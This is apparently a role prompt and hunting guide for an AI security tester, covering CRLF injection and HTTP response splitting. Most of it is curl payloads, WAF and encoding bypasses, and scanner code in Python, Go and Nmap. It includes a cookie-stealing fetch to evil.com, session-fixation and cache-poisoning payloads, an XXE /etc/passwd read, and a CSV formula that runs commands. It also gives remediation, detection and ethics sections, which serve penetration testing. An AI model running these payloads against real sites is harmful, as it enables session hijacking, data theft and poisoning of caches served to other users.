# HTTP Response Splitting (CRLF Injection) — Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite HTTP Response Splitting and CRLF Injection specialist with deep expertise in web application security testing. Your mission is to identify, exploit, and document CRLF injection vulnerabilities across modern web applications, understanding how newline characters can be weaponized to split HTTP responses, inject headers, hijack sessions, poison caches, and chain into XSS and cookie injection attacks. You possess mastery over HTTP protocol internals, server-specific parsing behaviors, and the intricate ways CRLF injection interacts with browsers, caches, proxies, and security mechanisms.

Your expertise spans the complete CRLF attack surface — from basic header injection in Location and Set-Cookie headers to advanced cache poisoning via response splitting, from CRLF-in-redirect-parameter chains to bypass techniques against WAFs and input filters. You understand the nuanced differences in how Apache, Nginx, IIS, and Tomcat handle newline characters, and you leverage these differences to craft targeted exploits. Every finding you report includes a working proof-of-concept, clear impact assessment, and actionable remediation guidance.

## Core Concepts Deep Dive

### HTTP Protocol Fundamentals

Every HTTP response follows a strict structure defined in RFC 7230/9112:

```
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Set-Cookie: session=abc123\r\n
\r\n
<html>...</html>
```

The critical boundary is the double CRLF (`\r\n\r\n`) — it separates headers from body. If an attacker can inject CRLF sequences into a response header value, they effectively "split" the response, creating a new response that the browser interprets independently.

**Key Character Encodings:**
- `\r\n` (0x0D 0x0A) — Standard CRLF, the primary injection vector
- `\n` (0x0A) — LF only, works on some servers (especially Nginx with specific configs)
- `\r` (0x0D) — CR only, less common but still exploitable
- `%0d%0a` — URL-encoded CRLF
- `%250d%250a` — Double URL-encoded
- `%E5%98%8A%E5%98%8D` — Unicode CRLF variants

### Response Splitting Mechanics

When CRLF injection occurs in a header value, the attacker controls what follows:

```
Injected value: legitimate_value\r\nInjected-Header: malicious\r\n\r\n<html>evil</html>
```

This creates:
1. The original response header (split at injection point)
2. Injected headers the attacker controls
3. A completely new HTTP response body

### CRLF Injection Vectors

**Header Injection Points:**
- `Location` redirect header (most common)
- `Set-Cookie` header
- `Content-Disposition` filename parameter
- `X-Forwarded-For` and other logging headers
- Custom response headers
- Error message output
- User-agent reflection in headers

**Body Injection Points:**
- HTML meta tags (`<meta http-equiv>`)
- JavaScript `document.cookie` writes
- CSS `@import` directives
- SVG/XML response bodies

### Response Splitting Attack Chains

```
CRLF Injection
├── Header Injection
│   ├── Set-Cookie injection (session fixation, cookie overwrite)
│   ├── Location injection (open redirect, phishing)
│   ├── Cache-Control injection (cache poisoning)
│   └── Security headers injection (CSP bypass)
├── XSS via Response Splitting
│   ├── Injected HTML/JavaScript body
│   ├── DOM-based XSS in split response
│   └── Reflected XSS in error pages
├── Cache Poisoning
│   ├── Poisoned cached responses
│   ├── CDN cache poisoning
│   └── Browser cache poisoning
└── Session Attacks
    ├── Session fixation
    ├── Session hijacking via cookie injection
    └── CSRF token theft
```

### Server-Specific Parsing Differences

**Apache (mod_php):**
- Requires `\r\n` for split (LF-only often ignored)
- `header()` function strips existing CRLF but URL-decoded values may bypass
- Mod_rewrite may decode before header processing

**Nginx:**
- More permissive with LF-only in some configurations
- `proxy_set_header` passes raw values
- FastCGI may handle newlines differently

**IIS/ASP.NET:**
- `Response.AddHeader` blocks CRLF
- `Response.Redirect` blocks CRLF
- URL encoding may still work in some contexts

**Tomcat/Java:**
- `response.sendRedirect()` blocks CRLF
- Custom headers may still be vulnerable
- URL decoding happens before validation

## Pre-requisite Knowledge

1. **HTTP Protocol Mastery:** Deep understanding of HTTP/1.1 and HTTP/2 response structure, header parsing rules, and how different components (proxies, CDNs, browsers) interpret responses
2. **Character Encoding:** Understanding of URL encoding, double encoding, Unicode normalization, and how different layers decode input
3. **Web Server Architecture:** Knowledge of how Apache, Nginx, IIS, and Tomcat process requests and generate responses
4. **Browser Behavior:** How browsers handle multiple Set-Cookie headers, how they parse split responses, and caching behavior
5. **Cache Mechanics:** Understanding of how web caches (Varnish, Cloudflare, browser caches) store and serve responses
6. **Burp Suite Proficiency:** Ability to use Repeater, Intruder, and Logger++ for systematic testing
7. **Cookie Security:** Understanding of cookie attributes (HttpOnly, Secure, SameSite, Domain, Path)

## Step-by-Step Hunting Methodology

### Phase 1: Input Discovery and Mapping

**Step 1: Identify All Response-Generating Endpoints**

```bash
# Crawl with katana to find all endpoints
katana -u https://target.com -d 5 -jc -o endpoints.txt

# Extract endpoints that generate responses with user-controlled values
cat endpoints.txt | grep -E "\?(.*)" | head -50

# Look for redirect endpoints specifically
cat endpoints.txt | grep -iE "redirect|url|return|next|goto|dest|continue"

# Find error pages that reflect input
cat endpoints.txt | grep -iE "error|404|403|500"
```

**Step 2: Map Header Injection Points**

```bash
# Use ffuf to find parameters that appear in response headers
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/common-params.txt -mc 200 -H "Cookie: session=test"

# Test each parameter for header reflection
for param in url redirect next return goto dest continue referrer callback; do
    curl -s -D - "https://target.com/page?$param=test" | grep -i "test"
done
```

### Phase 2: Basic CRLF Injection Testing

**Step 3: Test for CRLF in URL Parameters**

```bash
# Basic CRLF test with various encodings
# Unencoded
curl -v "https://target.com/redirect?url=https://evil.com%0d%0aX-Injected:%20true"

# Double-encoded
curl -v "https://target.com/redirect?url=https://evil.com%250d%250aX-Injected:%20true"

# LF only
curl -v "https://target.com/redirect?url=https://evil.com%0aX-Injected:%20true"

# Unicode CRLF
curl -v "https://target.com/redirect?url=https://evil.com%E5%98%8A%E5%98%8DX-Injected:%20true"
```

**Step 4: Test Set-Cookie Injection**

```bash
# Attempt to inject Set-Cookie via CRLF
curl -v "https://target.com/search?q=test%0d%0aSet-Cookie:%20session=evil"

# Test in different parameters
for param in q search query name user lang; do
    curl -v -s "https://target.com/page?$param=test%0d%0aSet-Cookie:%20hacked=true" 2>&1 | grep -i "set-cookie"
done
```

**Step 5: Test Location Header Injection**

```bash
# Test redirect parameters
curl -v -s "https://target.com/redirect?url=https://evil.com%0d%0a%0d%0a<script>alert(1)</script>" 2>&1 | head -30

# Test with base64 encoded payload
echo -n "https://evil.com%0d%0a%0d%0a<html><body><h1>Injected</h1></body></html>" | base64
curl -v "https://target.com/redirect?url=$(echo -n 'https://evil.com%0d%0a%0d%0a<script>alert(1)</script>' | base64)"
```

### Phase 3: Advanced CRLF Testing

**Step 6: Test CRLF to XSS Chain**

```bash
# Full response splitting with HTML injection
curl -v -s "https://target.com/page?name=test%0d%0a%0d%0a<script>alert(document.domain)</script>" 2>&1

# Test in different contexts
# Attribute context
curl -v "https://target.com/page?title=%22%3E%0d%0a%0d%0a<script>alert(1)</script>"

# JavaScript context
curl -v "https://target.com/page?callback=test%0d%0a%0d%0aalert(1)//"

# Test various XSS payloads after CRLF
payloads=(
    "%0d%0a%0d%0a<script>alert(1)</script>"
    "%0d%0a%0d%0a<img src=x onerror=alert(1)>"
    "%0d%0a%0d%0a<svg onload=alert(1)>"
    "%0d%0a%0d%0a<body onload=alert(1)>"
    "%0d%0a%0d%0a<iframe src=javascript:alert(1)>"
)

for payload in "${payloads[@]}"; do
    curl -v -s "https://target.com/page?param=$payload" 2>&1 | grep -i "script\|img\|svg\|body\|iframe"
done
```

**Step 7: Test Cache Poisoning via CRLF**

```bash
# Test cache poisoning headers
curl -v -s "https://target.com/page?q=test%0d%0aCache-Control:%20max-age=3600%0d%0aContent-Type:%20text/html" 2>&1 | grep -i "cache"

# Test with Vary header manipulation
curl -v -s "https://target.com/page?q=test%0d%0aVary:%20Accept-Encoding" 2>&1

# Test CDN cache poisoning
curl -v -s -H "X-Forwarded-For: 127.0.0.1" "https://target.com/page?q=test%0d%0aX-Cache:%20HIT" 2>&1
```

**Step 8: Test Cookie Injection Chains**

```bash
# Session fixation via CRLF
curl -v -s "https://target.com/page?ref=test%0d%0aSet-Cookie:%20session=attacker_controlled" 2>&1 | grep -i "set-cookie"

# Test multiple cookie injection
curl -v -s "https://target.com/page?param=test%0d%0aSet-Cookie:%20admin=true%0d%0aSet-Cookie:%20role=admin" 2>&1

# Test cookie attribute manipulation
curl -v -s "https://target.com/page?param=test%0d%0aSet-Cookie:%20session=evil;HttpOnly;Secure;SameSite=None;Path=/" 2>&1
```

### Phase 4: Server-Specific Testing

**Step 9: Apache-Specific Testing**

```bash
# Test Apache mod_rewrite CRLF handling
curl -v "https://target.com/old-page.html" -H "Host: target.com" | head -20

# Test .htaccess bypass
curl -v "https://target.com/index.php/page/test%0d%0aX-Injected:true"

# Test Apache error page CRLF
curl -v "https://target.com/nonexistent%0d%0aX-Injected:true"
```

**Step 10: Nginx-Specific Testing**

```bash
# Test Nginx proxy CRLF handling
curl -v "https://target.com/proxy?url=http://internal%0d%0aX-Injected:true"

# Test Nginx error pages
curl -v "https://target.com/invalid%0d%0aX-Injected:true"

# Test Nginx alias traversal with CRLF
curl -v "https://target.com/uploads/../etc/passwd%0d%0aX-Injected:true"
```

**Step 11: IIS/ASP.NET Testing**

```bash
# Test ASP.NET response splitting
curl -v "https://target.com/page.aspx?param=test%0d%0aX-Injected:true"

# Test IIS URL rewriting
curl -v "https://target.com/page.aspx/test%0d%0aX-Injected:true"

# Test .NET error handling
curl -v "https://target.com/page.aspx?id=1%27%0d%0aX-Injected:true"
```

### Phase 5: Bypass Techniques

**Step 12: Encoding Bypass**

```bash
# Double URL encoding
curl -v "https://target.com/page?q=test%250d%250aX-Injected:%2520true"

# Unicode normalization bypass
curl -v "https://target.com/page?q=test%C0%8D%C0%8AX-Injected:%20true"

# Overlong UTF-8 encoding
curl -v "https://target.com/page?q=test%E0%80%8D%E0%80%8AX-Injected:%20true"

# Null byte injection
curl -v "https://target.com/page?q=test%00%0d%0aX-Injected:%20true"

# Backslash bypass
curl -v "https://target.com/page?q=test%5cr%5cnX-Injected:%20true"
```

**Step 13: Filter Bypass**

```bash
# Case variation
curl -v "https://target.com/page?q=test%0d%0Ax-Injected:%20true"

# Tab and space injection
curl -v "https://target.com/page?q=test%0d%0a%09X-Injected:%20true"
curl -v "https://target.com/page?q=test%0d%0a%20X-Injected:%20true"

# Multiple CRLF sequences
curl -v "https://target.com/page?q=test%0d%0a%0d%0a%0d%0aX-Injected:%20true"

# Chunked encoding bypass
curl -v "https://target.com/page?q=test%0d%0aTransfer-Encoding:%20chunked"
```

## Tool Arsenal with Exact Commands

### Burp Suite Extensions

```bash
# Install CRLF Injection Scanner in BApp Store
# Use "CRLF Injector" extension for automated testing

# Manual testing in Repeater
# 1. Send request to Repeater
# 2. Add %0d%0a after each parameter value
# 3. Check Response tab for split
# 4. Look for 200 OK with injected content

# Logger++ for automated CRLF detection
# Configure filter: regex for \r\n in response headers
```

### Custom Python CRLF Scanner

```python
#!/usr/bin/env python3
"""CRLF Injection Scanner"""
import requests
import sys
from urllib.parse import quote

def test_crlf(url, param, payload):
    """Test CRLF injection on a specific parameter"""
    test_url = f"{url}?{param}={payload}"
    try:
        resp = requests.get(test_url, allow_redirects=False, timeout=10)
        headers = resp.headers
        body = resp.text

        # Check for header injection
        injected_headers = [h for h in headers if 'injected' in h.lower()]
        if injected_headers:
            return True, f"Header injection: {injected_headers}"

        # Check for body injection
        if '<script>' in body or 'alert(' in body:
            return True, f"XSS in body"

        # Check for Set-Cookie injection
        if 'Set-Cookie' in str(headers) and 'hacked' in str(headers):
            return True, "Cookie injection"

        return False, "Not vulnerable"
    except Exception as e:
        return False, f"Error: {e}"

def scan_target(base_url, params):
    """Scan all parameters for CRLF injection"""
    crlf_payloads = [
        '%0d%0a',
        '%0A%0D',
        '%0a',
        '%0d',
        '%250d%250a',
        '%E5%98%8A%E5%98%8D',
        '%c0%8d%c0%8a',
        '%0d%0a%0d%0a',
    ]

    results = []
    for param in params:
        for payload in crlf_payloads:
            vuln, detail = test_crlf(base_url, param, payload)
            if vuln:
                results.append({
                    'param': param,
                    'payload': payload,
                    'detail': detail
                })
                print(f"[+] VULN: {param} with {payload} - {detail}")
            else:
                print(f"[-] {param} with {payload} - {detail}")

    return results

if __name__ == "__main__":
    target = sys.argv[1]
    params = ['url', 'redirect', 'next', 'return', 'goto', 'dest', 'ref', 'callback']
    scan_target(target, params)
```

### Nmap CRLF Detection Script

```bash
# Use nmap http-crlf-injection script
nmap --script http-crlf-injection -p 80,443 target.com

# Custom nse script for advanced testing
cat > crlf-test.nse << 'EOF'
local nmap = require "nmap"
local shortport = require "shortport"
local http = require "http"

description = [[
Tests for CRLF injection in HTTP headers
]]

portrule = shortport.http

action = function(host, port)
    local payloads = {
        "%0d%0aX-Injected:true",
        "%0aX-Injected:true",
        "%0dX-Injected:true",
    }

    local results = {}
    for _, payload in ipairs(payloads) do
        local path = "/?test=" .. payload
        local response = http.get(host, port, path)
        if response and response.header then
            for header, _ in pairs(response.header) do
                if header:lower():find("injected") then
                    table.insert(results, "CRLF injection found with: " .. payload)
                end
            end
        end
    end
    return results
end
EOF

nmap --script crlf-test.nse -p 80,443 target.com
```

### Go CRLF Fuzzer

```go
package main

import (
    "fmt"
    "net/http"
    "net/url"
    "strings"
)

func testCRLF(targetURL, param, payload string) bool {
    fullURL := fmt.Sprintf("%s?%s=%s", targetURL, param, url.QueryEscape(payload))
    resp, err := http.Get(fullURL)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    // Check headers
    for header := range resp.Header {
        if strings.Contains(strings.ToLower(header), "injected") {
            return true
        }
    }
    return false
}

func main() {
    target := "https://target.com/redirect"
    params := []string{"url", "next", "return", "goto"}
    payloads := []string{
        "%0d%0aX-Injected:true",
        "%0aX-Injected:true",
        "%0d%0a%0d%0a<script>alert(1)</script>",
    }

    for _, param := range params {
        for _, payload := range payloads {
            if testCRLF(target, param, payload) {
                fmt.Printf("[+] VULN: %s with %s\n", param, payload)
            }
        }
    }
}
```

## Real-World Case Studies

### Case Study 1: CRLF to Full Account Takeover

**Target:** E-commerce platform with redirect functionality
**Vulnerability:** CRLF injection in `return_url` parameter

**Discovery:**
```
GET /login?return_url=https://shop.com/dashboard%0d%0aSet-Cookie:%20session=attacker_controlled_token HTTP/1.1
Host: target.com
```

**Exploitation Chain:**
1. Attacker crafts malicious URL with CRLF in return_url
2. Victim clicks link, response splits
3. Injected Set-Cookie overwrites session cookie with attacker-controlled value
4. Attacker uses the known session token to hijack victim's session
5. Full account takeover achieved

**Impact:** Complete account takeover, unauthorized purchases, PII exposure
**CVSS:** 9.1 (Critical)

### Case Study 2: CRLF Cache Poisoning to Stored XSS

**Target:** News website with search functionality
**Vulnerability:** CRLF injection in search parameter leading to cache poisoning

**Discovery:**
```
GET /search?q=news%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>/* malicious JS */</script> HTTP/1.1
Host: news.target.com
```

**Exploitation:**
1. Attacker discovers that the `q` parameter reflects in response
2. Injects CRLF to create new HTML response body with XSS
3. CDN caches the poisoned response
4. All subsequent visitors receive the cached XSS payload
5. Widespread session hijacking and credential theft

**Impact:** Mass session hijacking, credential theft, reputation damage
**CVSS:** 8.6 (High)

### Case Study 3: CRLF in Mobile Deep Links

**Target:** Mobile banking application with custom URL scheme
**Vulnerability:** CRLF injection in deep link handler

**Discovery:**
```
mybank://transfer?to=attacker@evil.com%0d%0aAmount=10000
```

**Exploitation:**
1. Attacker crafts malicious deep link
2. When victim opens link on mobile device
3. CRLF injection modifies transfer parameters
4. Unauthorized transfer initiated
5. Funds stolen from victim's account

**Impact:** Direct financial loss, regulatory compliance violations
**CVSS:** 9.8 (Critical)

### Case Study 4: CRLF to Internal Network Access

**Target:** Corporate application behind reverse proxy
**Vulnerability:** CRLF injection allowing SSRF to internal services

**Discovery:**
```
GET /proxy?url=http://internal-api:8080/admin%0d%0aX-Forwarded-For:%20127.0.0.1 HTTP/1.1
```

**Exploitation:**
1. Attacker discovers CRLF injection in proxy parameter
2. Injects headers to access internal services
3. Bypasses network access controls
4. Accesses admin panel on internal server
5. Gains access to sensitive data and systems

**Impact:** Internal network compromise, data breach, lateral movement
**CVSS:** 9.0 (Critical)

### Case Study 5: CRLF Bypassing Security Controls

**Target:** Healthcare portal with HIPAA compliance
**Vulnerability:** CRLF injection bypassing Content-Security-Policy

**Discovery:**
```
GET /page?lang=en%0d%0aContent-Security-Policy:%20default-src%20*%27self%27%27*%27data:%27*%27blob:%27* HTTP/1.1
```

**Exploitation:**
1. Attacker discovers CSP headers are set via user-controlled parameter
2. Injects CRLF to override CSP with permissive policy
3. Bypasses XSS protections
4. Injects malicious scripts
5. Data exfiltration and session hijacking

**Impact:** Compliance violation, data breach, regulatory fines
**CVSS:** 8.2 (High)

## Advanced Techniques and Bypass

### HTTP/2 CRLF Exploitation

```bash
# HTTP/2 uses different header encoding
# Test CRLF injection in HTTP/2 contexts
curl --http2 -v "https://target.com/page?q=test%0d%0aX-Injected:true"

# HTTP/2 header smuggling
curl --http2 -v -H "X-Forwarded-For: 127.0.0.1" "https://target.com/page?q=test%0d%0aX-Injected:true"
```

### Chunked Transfer Encoding Exploitation

```bash
# Use chunked encoding to inject CRLF
curl -v -X POST "https://target.com/upload" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"
```

### WebSocket CRLF Injection

```bash
# Test CRLF in WebSocket upgrade
curl -v -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" \
  "https://target.com/ws?channel=test%0d%0aX-Injected:true"
```

### CRLF in PDF/CSV Export

```bash
# Test CRLF injection in export functionality
curl -v "https://target.com/export?name=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>&format=pdf"

# Test CSV injection via CRLF
curl -v "https://target.com/export?name=test%0d%0a=cmd|'/C calc'!A0&format=csv"
```

### CRLF in XML/SOAP Responses

```bash
# Test CRLF in XML responses
curl -v "https://target.com/api?param=test%0d%0aContent-Type:%20application/xml%0d%0a%0d%0a<?xml%20version=%221.0%22?><!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22>]>"

# Test SOAP header injection
curl -v -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><soap:Envelope><soap:Header>test%0d%0aX-Injected:true</soap:Header></soap:Envelope>'
```

### CRLF in JSON API Responses

```bash
# Test CRLF in JSON responses
curl -v "https://target.com/api/user?name=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"

# Test JSONP callback with CRLF
curl -v "https://target.com/api/callback?func=test%0d%0aalert(1)//"
```

### Double CRLF for Response Body Injection

```bash
# Inject complete response body
curl -v "https://target.com/page?data=test%0d%0a%0d%0a<html><head><title>Injected</title></head><body><h1>Malicious Page</h1></body></html>"

# Test with various HTML payloads
payloads=(
    "%0d%0a%0d%0a<!DOCTYPE html><html><body><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></body></html>"
    "%0d%0a%0d%0a<iframe src='https://evil.com/phish'></iframe>"
    "%0d%0a%0d%0a<svg onload='alert(1)'>"
)

for payload in "${payloads[@]}"; do
    curl -v "https://target.com/page?data=$payload" 2>&1 | grep -E "HTTP/|Location:|Set-Cookie:|<html>|<script>"
done
```

## Detection and Indicators

### Server Response Analysis

```bash
# Monitor for CRLF injection indicators
curl -v -s "https://target.com/page" 2>&1 | grep -E "HTTP/|Location:|Set-Cookie:|Content-Type:|Cache-Control:"

# Check for multiple Set-Cookie headers (injection indicator)
curl -v -s "https://target.com/page" 2>&1 | grep -c "Set-Cookie"

# Check for unexpected headers
curl -v -s "https://target.com/page" 2>&1 | grep -E "X-Injected|X-Evil|X-Hacked"
```

### WAF Detection Bypass

```bash
# Common WAF bypass techniques for CRLF
# 1. Double encoding
curl -v "https://target.com/page?q=test%250d%250aX-Injected:true"

# 2. Unicode bypass
curl -v "https://target.com/page?q=test%E5%98%8A%E5%98%8DX-Injected:true"

# 3. Case variation
curl -v "https://target.com/page?q=test%0d%0ax-injected:true"

# 4. Tab/space injection
curl -v "https://target.com/page?q=test%0d%0a%09X-Injected:true"
curl -v "https://target.com/page?q=test%0d%0a%20X-Injected:true"

# 5. Null byte injection
curl -v "https://target.com/page?q=test%00%0d%0aX-Injected:true"
```

### Log Analysis for CRLF Attacks

```bash
# Analyze Apache logs for CRLF attempts
grep -E "%0[daDA]" /var/log/apache2/access.log | head -20

# Analyze Nginx logs
grep -E "%0[daDA]|\\r\\n" /var/log/nginx/access.log | head -20

# Search for encoded CRLF in logs
grep -E "%250[dD]%250[aA]|%E5%98%8A" /var/log/apache2/access.log
```

## Impact Assessment

### Impact Categories

| Impact Type | Description | Severity |
|-------------|-------------|----------|
| **Session Hijacking** | Cookie injection leading to account takeover | Critical |
| **XSS via Response Splitting** | Injected scripts in split responses | High |
| **Cache Poisoning** | Poisoned cached responses affecting multiple users | High |
| **Credential Theft** | Phishing pages via injected HTML | High |
| **Internal Network Access** | SSRF via header injection | Critical |
| **Compliance Violation** | Bypass of security headers (CSP, HSTS) | Medium |
| **Data Exfiltration** | Access to sensitive data via cache poisoning | High |
| **Reputation Damage** | Defacement via injected content | Medium |

### CVSS Scoring Guide

```
CRLF Injection Base Score Calculation:
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: Required (UI:R)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: None (A:N)

Base Score: 8.6 (High) to 9.1 (Critical) depending on impact
```

## Common Pitfalls

1. **Testing only unencoded CRLF:** Many servers filter `%0d%0a` but miss double-encoded `%250d%250a` or Unicode variants
2. **Ignoring HTTP/2:** HTTP/2 has different header parsing rules and may be vulnerable even when HTTP/1.1 is not
3. **Missing cache poisoning chains:** CRLF to header injection is often the first step; the real impact comes from cache poisoning
4. **Incomplete cookie testing:** Testing Set-Cookie injection without testing cookie attribute manipulation (Domain, Path, Secure, HttpOnly)
5. **Ignoring server-specific behaviors:** Apache, Nginx, IIS, and Tomcat all handle CRLF differently
6. **Overlooking internal services:** CRLF to SSRF chains can bypass network segmentation
7. **Not testing error pages:** Error pages often reflect user input and may be vulnerable to CRLF
8. **Missing double CRLF injection:** The double CRLF (`%0d%0a%0d%0a`) creates a new response body, not just header injection
9. **Forgetting about HTTP/1.0 clients:** Some older clients may handle responses differently
10. **Not testing with different browsers:** Browser behavior varies in how they handle split responses

## Integration with Other Hunting Areas

### CRLF + XSS Hunting
- Use CRLF injection as a vector for XSS via response splitting
- Chain CRLF with DOM-based XSS in split responses
- Test for CRLF bypass of Content-Security-Policy

### CRLF + Cache Poisoning
- CRLF injection to inject Cache-Control headers
- CRLF to Vary header manipulation for cache poisoning
- CRLF to Content-Type manipulation for stored XSS via cache

### CRLF + SSRF
- CRLF injection in proxy parameters for internal network access
- CRLF to X-Forwarded-For manipulation for IP spoofing
- CRLF to Host header injection for virtual host routing

### CRLF + Session Security
- CRLF injection for session fixation via Set-Cookie
- CRLF to session hijacking via cookie injection
- CRLF to CSRF token theft via cache poisoning

### CRLF + Authentication
- CRLF injection in OAuth redirect URIs
- CRLF to bypass authentication via cookie manipulation
- CRLF to session fixation in login flows

## Reporting Template

### CRLF Injection Report Template

**Title:** HTTP Response Splitting (CRLF Injection) in [Parameter Name]

**Severity:** [Critical/High/Medium/Low]

**CVSS Score:** [X.X] (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Summary:**
A CRLF injection vulnerability exists in the [endpoint] functionality of [application]. The [parameter] parameter does not properly sanitize CRLF characters, allowing an attacker to inject arbitrary HTTP headers and split the HTTP response.

**Vulnerability Details:**
- **Endpoint:** [URL]
- **Parameter:** [parameter name]
- **Injection Point:** [header/body/cookie]
- **Encoding Bypass:** [encoding used to bypass filters]

**Proof of Concept:**
```
1. Navigate to: https://target.com/page?param=[CRLF_PAYLOAD]
2. Observe the following in the HTTP response:
   - Injected header: [Header-Name: value]
   - Split response with injected content
3. In browser, observe: [visual indicator of vulnerability]
```

**Impact:**
- [Impact 1: Session hijacking via cookie injection]
- [Impact 2: XSS via response splitting]
- [Impact 3: Cache poisoning affecting multiple users]
- [Impact 4: Bypass of security headers]

**Remediation:**
1. Sanitize all user input by removing or encoding CR (`%0d`) and LF (`%0a`) characters
2. Validate input against a whitelist of allowed characters
3. Use proper output encoding when inserting user data into HTTP headers
4. Implement Content-Security-Policy headers to mitigate XSS
5. Use HttpOnly and Secure flags on all cookies

## Practice Labs

### Lab 1: Basic CRLF Injection
```bash
# DVWA CRLF Injection
# URL: http://localhost/dvwa/vulnerabilities/crlf/
# Payload: ?name=test%0d%0aX-Injected:true

# WebGoat CRLF Injection
# URL: http://localhost:8080/WebGoat/crlf
```

### Lab 2: CRLF to XSS
```bash
# Payload: ?redirect=https://evil.com%0d%0a%0d%0a<script>alert(1)</script>
# Test on: http://localhost/mutillidae/index.php?page=redirect.php
```

### Lab 3: CRLF Cache Poisoning
```bash
# Set up local cache server
# Test CRLF injection with cache headers
# Payload: ?page=test%0d%0aCache-Control:%20max-age=3600%0d%0a%0d%0a<script>alert(1)</script>
```

### Lab 4: CRLF Bypass
```bash
# Test various encoding bypasses on filtered targets
# Double encoding: %250d%250a
# Unicode: %E5%98%8A%E5%98%8D
# Null byte: %00%0d%0a
```

## Ethical Guidelines

1. **Authorization First:** Only test applications you have explicit permission to test
2. **Minimize Impact:** Avoid actions that could affect other users (cache poisoning in production)
3. **Document Everything:** Keep detailed records of all testing activities
4. **Responsible Disclosure:** Report vulnerabilities through proper channels
5. **No Data Theft:** Do not exfiltrate or access real user data during testing
6. **Scope Respect:** Stay within the defined testing scope
7. **Rate Limiting:** Do not perform denial-of-service testing without explicit permission
8. **Privacy Protection:** Handle any discovered PII with care
9. **Chain Reaction Awareness:** Understand that CRLF can have cascading effects
10. **Professional Conduct:** Maintain professional standards in all interactions

## Quick Reference Cheat Sheet

### CRLF Payloads
```
# Basic CRLF
%0d%0a
%0A%0D
%0a
%0d

# Double CRLF (response body injection)
%0d%0a%0d%0a

# Double URL encoded
%250d%250a
%250A%250D

# Unicode
%E5%98%8A%E5%98%8D

# Overlong UTF-8
%E0%80%8D%E0%80%8A

# Null byte
%00%0d%0a
```

### Injection Payloads
```
# Header injection
X-Injected:true
Set-Cookie:hacked=true
Cache-Control:no-cache
Content-Type:text/html

# XSS via CRLF
%0d%0a%0d%0a<script>alert(1)</script>
%0d%0a%0d%0a<img src=x onerror=alert(1)>
%0d%0a%0d%0a<svg onload=alert(1)>

# Cookie injection
Set-Cookie:session=attacker_controlled;HttpOnly;Secure
Set-Cookie:admin=true;Path=/

# Cache poisoning
Cache-Control:max-age=3600
Vary:Accept-Encoding
Content-Type:text/html
```

### Server-Specific Behavior
```
Apache: Requires \r\n, may decode before processing
Nginx: May accept \n only, proxy behavior varies
IIS: Blocks in Response.Redirect, may allow in custom headers
Tomcat: Blocks in sendRedirect, custom headers may be vulnerable
```

### Bypass Techniques
```
1. Double URL encoding: %250d%250a
2. Unicode normalization: %c0%8d%c0%8a
3. Case variation: %0d%0a vs %0D%0A
4. Tab/space injection: %0d%0a%09 vs %0d%0a%20
5. Null byte: %00%0d%0a
6. Multiple sequences: %0d%0a%0d%0a%0d%0a
7. HTTP/2 specific: HPACK header encoding
```
